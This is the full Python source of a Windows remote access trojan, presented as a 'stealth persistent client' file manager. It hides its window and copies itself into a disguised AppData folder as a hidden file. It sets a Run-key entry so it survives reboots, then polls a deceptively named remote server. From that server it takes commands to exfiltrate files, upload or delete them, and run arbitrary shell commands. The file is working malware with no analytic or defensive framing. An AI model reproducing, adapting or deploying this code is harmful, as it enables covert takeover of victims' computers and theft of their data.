#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Remote File Manager - Windows stealth persistent client.
Zero dependencies, pure standard library.

Behavior:
  * First run: copies itself to %APPDATA%, registers HKCU\\...\\Run entry,
    spawns the installed copy detached (no window), exits.
  * Every later run (from the installed .pyw): ensures persistence still
    exists, then runs the polling loop forever.
  * Single-instance enforced with a named Windows mutex.
  * Runs under pythonw.exe with hidden console and redirected stdout/stderr
    to a log file (since pythonw has no console).
"""

import base64
import ctypes
import getpass
import json
import os
import shutil
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request
import winreg

# ============================================================================
# PERSISTENCE / STEALTH CONFIG
# ============================================================================
APP_NAME     = "WinRuntimeHelper"
INSTALL_DIR  = os.path.join(
    os.environ.get("APPDATA", os.path.expanduser("~")),
    "Microsoft", "Windows", "WinRuntimeHelper"
)
INSTALL_FILE = os.path.join(INSTALL_DIR, "runtime_helper.pyw")
LOG_FILE     = os.path.join(INSTALL_DIR, "runtime.log")
MUTEX_NAME   = "Local\\" + APP_NAME + "_SingleInstance_Mutex"


# ============================================================================
# STEALTH / PERSISTENCE HELPERS
# ============================================================================
def hide_console():
    """Hide any console window (SW_HIDE) if we were launched by python.exe."""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


def redirect_io():
    """pythonw.exe has no stdout/stderr; redirect them to a log file."""
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        log = open(LOG_FILE, "a", encoding="utf-8", buffering=1)
    except Exception:
        try:
            log = open(os.devnull, "a")
        except Exception:
            return
    try:
        sys.stdout = log
        sys.stderr = log
    except Exception:
        pass


def get_pythonw():
    """Return full path to pythonw.exe (never opens a console)."""
    exe = sys.executable
    low = exe.lower()
    if low.endswith("python.exe"):
        cand = exe[:-len("python.exe")] + "pythonw.exe"
        if os.path.exists(cand):
            return cand
    if low.endswith("pythonw.exe") and os.path.exists(exe):
        return exe
    cand = os.path.join(os.path.dirname(exe), "pythonw.exe")
    if os.path.exists(cand):
        return cand
    return exe


def acquire_single_instance_mutex():
    """Return a handle if we are the only instance, else None."""
    k = ctypes.windll.kernel32
    handle = k.CreateMutexW(None, False, MUTEX_NAME)
    if not handle:
        return None
    if k.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        k.CloseHandle(handle)
        return None
    return handle


def release_mutex(handle):
    if handle:
        try:
            ctypes.windll.kernel32.CloseHandle(handle)
        except Exception:
            pass


def is_running_from_install_location():
    try:
        me = os.path.normcase(os.path.abspath(__file__))
        target = os.path.normcase(os.path.abspath(INSTALL_FILE))
        return me == target
    except Exception:
        return False


def install_self():
    """Copy this script to INSTALL_FILE (only if content differs)."""
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
    except Exception:
        return INSTALL_FILE

    try:
        src = os.path.abspath(__file__)
    except Exception:
        return INSTALL_FILE
    dst = INSTALL_FILE

    try:
        if os.path.normcase(src) == os.path.normcase(dst):
            return dst
    except Exception:
        pass

    need_copy = True
    try:
        if os.path.exists(dst) and os.path.getsize(src) == os.path.getsize(dst):
            with open(src, "rb") as f1, open(dst, "rb") as f2:
                need_copy = (f1.read() != f2.read())
    except Exception:
        need_copy = True

    if need_copy:
        try:
            shutil.copy2(src, dst)
        except Exception:
            pass

    # Mark hidden (best effort, no admin needed for files we own).
    try:
        ctypes.windll.kernel32.SetFileAttributesW(dst, 0x02)
    except Exception:
        pass

    return dst


def register_persistence():
    """Create / refresh HKCU Run entry pointing at pythonw + installed file."""
    try:
        pythonw = get_pythonw()
        cmd = '"{}" "{}"'.format(pythonw, INSTALL_FILE)
        with winreg.CreateKeyEx(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as k:
            winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, cmd)
    except Exception:
        pass


def unregister_persistence():
    """Optional: remove the Run entry (used by uninstall)."""
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as k:
            winreg.DeleteValue(k, APP_NAME)
    except FileNotFoundError:
        pass
    except Exception:
        pass


def launch_installed_detached():
    """Start the installed copy fully detached, window-less."""
    try:
        pythonw = get_pythonw()
        DETACHED_PROCESS         = 0x00000008
        CREATE_NO_WINDOW         = 0x08000000
        CREATE_NEW_PROCESS_GROUP = 0x00000200
        subprocess.Popen(
            [pythonw, INSTALL_FILE],
            cwd=INSTALL_DIR,
            close_fds=True,
            creationflags=(DETACHED_PROCESS |
                           CREATE_NO_WINDOW |
                           CREATE_NEW_PROCESS_GROUP),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


# ============================================================================
# CLIENT CONFIG
# ============================================================================
SERVER_URL = "https://googleforum.pythonanywhere.com"
POLL_INTERVAL = 2  # seconds

try:
    username = getpass.getuser()
except Exception:
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
hostname = socket.gethostname()
client_id = f"{username}@{hostname}"
client_name = f"{username} ({hostname})"


# ============================================================================
# HTTP HELPERS
# ============================================================================
def request(method, url, data=None):
    """Send an HTTP request and return parsed JSON (or raw text on parse failure)."""
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data).encode("utf-8")
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))

    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError:
        raise

    try:
        return json.loads(raw)
    except Exception:
        return raw


# ============================================================================
# REGISTRATION
# ============================================================================
def register():
    try:
        request("POST", f"{SERVER_URL}/api/register", {
            "client_id": client_id,
            "name": client_name,
        })
        print("✅ Registered with server")
        return True
    except Exception as e:
        print(f"❌ Registration failed: {e}")
        return False


# ============================================================================
# HEARTBEAT
# ============================================================================
def send_heartbeat():
    try:
        request("POST", f"{SERVER_URL}/api/heartbeat", {"client_id": client_id})
        return True
    except Exception:
        return False


# ============================================================================
# RESOLVE PATH
# ============================================================================
def resolve_path(raw_path):
    if raw_path in ("/", "", "."):
        return "C:\\" if sys.platform == "win32" else "/"
    return raw_path


# ============================================================================
# COMMAND HANDLERS
# ============================================================================
def handle_list(params):
    target = resolve_path(params.get("path") or ".")
    try:
        entries = os.listdir(target)
        items = []
        for name in entries:
            full = os.path.join(target, name)
            try:
                stat = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": stat.st_size,
                    "modified": stat.st_mtime * 1000,
                })
            except Exception as e:
                print(f"Skipping {name}: {e}")
        return {"success": True, "result": items}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_download(params):
    path = resolve_path(params.get("path"))
    try:
        with open(path, "rb") as f:
            data = f.read()
        return {"success": True, "result": {
            "data": base64.b64encode(data).decode("ascii"),
            "size": len(data),
        }}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_upload(params):
    directory = resolve_path(params.get("path") or ".")
    filename = params.get("filename")
    try:
        data = base64.b64decode(params.get("data", ""))
        full = os.path.join(directory, filename)
        with open(full, "wb") as f:
            f.write(data)
        return {"success": True, "result": {"path": full}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_delete(params):
    path = resolve_path(params.get("path"))
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        return {"success": True, "result": {"deleted": path}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_rename(params):
    old = resolve_path(params.get("old"))
    new = resolve_path(params.get("new"))
    try:
        os.rename(old, new)
        return {"success": True, "result": {"from": old, "to": new}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_open(params):
    path = resolve_path(params.get("path"))
    try:
        if sys.platform == "win32":
            os.startfile(path)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])
        return {"success": True, "result": {"opened": path}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_exec(params):
    command = params.get("command")
    cwd = resolve_path(params.get("cwd") or ".")
    try:
        proc = subprocess.run(
            command,
            cwd=cwd,
            shell=True,
            timeout=30,
            capture_output=True,
            text=True,
        )
        output = proc.stdout or ""
        if proc.stderr:
            output += ("\n" if output else "") + proc.stderr
        if proc.returncode != 0:
            return {"success": False,
                    "error": f"{command} exited with {proc.returncode}\n{output}"}
        return {"success": True, "result": {"output": output}}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Command timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}


COMMAND_HANDLERS = {
    "list": handle_list,
    "download": handle_download,
    "upload": handle_upload,
    "delete": handle_delete,
    "rename": handle_rename,
    "open": handle_open,
    "exec": handle_exec,
}


# ============================================================================
# POLLING
# ============================================================================
def poll_commands():
    try:
        response = request("GET", f"{SERVER_URL}/api/client/{client_id}/poll")
    except Exception:
        return
    if not isinstance(response, dict):
        return

    commands = response.get("commands") or []
    for cmd in commands:
        cid = cmd.get("id")
        name = cmd.get("command")
        params = cmd.get("params") or {}
        print(f"📨 Received command: {name} ({cid})")

        handler = COMMAND_HANDLERS.get(name)
        if handler:
            try:
                result = handler(params)
            except Exception as e:
                result = {"success": False, "error": str(e)}
        else:
            result = {"success": False, "error": f"Unknown command: {name}"}

        try:
            request("POST", f"{SERVER_URL}/api/client/{client_id}/result", {
                "command_id": cid,
                "result": result.get("result") if result.get("success") else None,
                "error": None if result.get("success") else result.get("error"),
            })
            print(f"✅ Command {cid} completed")
        except Exception as e:
            print(f"❌ Failed to send result for {cid}: {e}")


# ============================================================================
# MAIN CLIENT LOOP (payload)
# ============================================================================
def run_client():
    print("🔌 Remote File Manager Client")
    print(f"   ID: {client_id}")
    print(f"   Name: {client_name}")
    print(f"   Server: {SERVER_URL}")
    print(f"   Started: {time.strftime('%Y-%m-%d %H:%M:%S')} (pid={os.getpid()})")

    while not register():
        print("⏳ Retrying registration in 5s...")
        time.sleep(5)

    print("🔄 Starting polling loop...")
    while True:
        try:
            send_heartbeat()
            poll_commands()
        except KeyboardInterrupt:
            raise
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)


# ============================================================================
# ENTRY POINT
# ============================================================================
def main():
    # 1) Never show a window, even if launched by python.exe.
    hide_console()

    # 2) Redirect stdout/stderr (pythonw has none).
    redirect_io()

    # 3) First-run path: we are NOT the installed copy yet.
    if not is_running_from_install_location():
        install_self()
        register_persistence()
        launch_installed_detached()
        return

    # 4) Normal runtime: we are the installed copy.
    #    Enforce single-instance so a 2nd run never overlaps the 1st.
    mutex = acquire_single_instance_mutex()
    if mutex is None:
        return
    try:
        # Self-heal: keep file & registry entry fresh.
        install_self()
        register_persistence()
        # Run the actual payload forever.
        run_client()
    finally:
        release_mutex(mutex)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception:
        # Never crash loudly in a background process.
        sys.exit(0)
